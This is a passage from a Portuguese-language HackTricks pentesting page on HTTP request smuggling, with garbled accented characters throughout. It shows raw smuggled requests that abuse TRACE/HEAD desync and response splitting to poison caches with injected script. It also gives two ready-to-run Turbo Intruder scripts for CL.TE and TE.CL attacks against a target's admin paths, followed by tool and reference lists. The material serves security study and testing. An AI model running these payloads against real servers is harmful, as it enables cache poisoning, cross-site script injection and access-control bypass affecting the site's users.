Como a resposta do HEAD conter√° um cabe√ßalho `Content-Length`, a **resposta do pedido TRACE ser√° tratada como o corpo da resposta HEAD, refletindo assim dados arbitr√°rios** na resposta. \
Essa resposta ser√° enviada para o pr√≥ximo pedido sobre a conex√£o, ent√£o isso poderia ser **usado em um arquivo JS em cache, por exemplo, para injetar c√≥digo JS arbitr√°rio**.

### Abusando do TRACE via HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continuar seguindo [**este post**](https://portswigger.net/research/trace-desync-attack) sugere outra maneira de abusar do m√©todo TRACE. Como comentado, contrabandeando um pedido HEAD e um pedido TRACE, √© poss√≠vel **controlar alguns dados refletidos** na resposta ao pedido HEAD. O comprimento do corpo do pedido HEAD √© basicamente indicado no cabe√ßalho Content-Length e √© formado pela resposta ao pedido TRACE.

Portanto, a nova ideia seria que, sabendo esse Content-Length e os dados fornecidos na resposta TRACE, √© poss√≠vel fazer com que a resposta TRACE contenha uma resposta HTTP v√°lida ap√≥s o √∫ltimo byte do Content-Length, permitindo que um atacante controle completamente o pedido para a pr√≥xima resposta (o que poderia ser usado para realizar um cache poisoning).

Exemplo:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Gerar√° essas respostas (note como a resposta HEAD tem um Content-Length fazendo com que a resposta TRACE fa√ßa parte do corpo da HEAD e, uma vez que o Content-Length da HEAD termina, uma resposta HTTP v√°lida √© escondida):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(‚Äúarbitrary response‚Äù)</script>
```
### Armando HTTP Request Smuggling com Desincroniza√ß√£o de Resposta HTTP

Voc√™ encontrou alguma vulnerabilidade de HTTP Request Smuggling e n√£o sabe como explor√°-la. Tente este outro m√©todo de explora√ß√£o:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Outras T√©cnicas de HTTP Request Smuggling

* HTTP Request Smuggling no Navegador (Lado do Cliente)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling em Downgrades de HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Scripts Turbo Intruder

### CL.TE

De [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Ferramentas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta ferramenta √© um Fuzzer HTTP baseado em gram√°tica √∫til para encontrar discrep√¢ncias estranhas de request smuggling.

## Refer√™ncias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
